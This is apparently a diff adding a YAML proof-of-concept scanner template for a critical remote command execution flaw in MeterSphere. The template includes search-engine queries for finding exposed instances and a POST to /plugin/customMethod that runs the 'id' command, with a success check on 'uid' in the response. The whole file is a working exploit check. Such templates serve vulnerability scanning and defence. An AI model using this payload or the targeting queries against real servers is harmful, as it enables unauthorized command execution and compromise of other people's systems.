@@ -1,0 +1,35 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="FIT2CLOUD-MeterSphere"
+    hunter-query: app.name=="MeterSphere"
+    quake-query: favicon:"d6abc57c65b787c0418803ffc75a7fa0" OR title:"MeterSphere"
+    zoomeye-query: iconhash:"d6abc57c65b787c0418803ffc75a7fa0" title:"MeterSphere"
+    threatbook-query: title=MeterSphere
+    cve: 
+    cnvd: 
+    
+name: poc-yaml-MeterSphere-customMethod-rce
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s1: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /plugin/customMethod
+      follow_redirects: false
+      headers:
+        Content-Type: application/json
+        Accept-Encoding: gzip
+      body: |
+        {"entry":"Evil","request":"id"}
+    expression: >-
+      response.status == 200 && response.body_string.contains("uid")
+
+expression: r0() 
+
